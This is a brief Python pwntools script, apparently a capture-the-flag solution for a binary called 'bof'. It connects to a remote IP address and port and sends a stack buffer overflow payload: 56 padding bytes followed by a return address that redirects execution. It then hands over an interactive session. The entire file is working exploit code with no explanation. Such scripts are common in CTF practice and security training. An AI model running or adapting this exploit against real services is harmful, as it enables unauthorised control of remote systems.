#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = remote('60.250.197.227', 10000)
#r = process('./bof')
#gdb.attach(proc.pidof(r)[0])

r.recvline()
r.sendline(b'A' * 56 + p64(0x400688))

r.interactive()
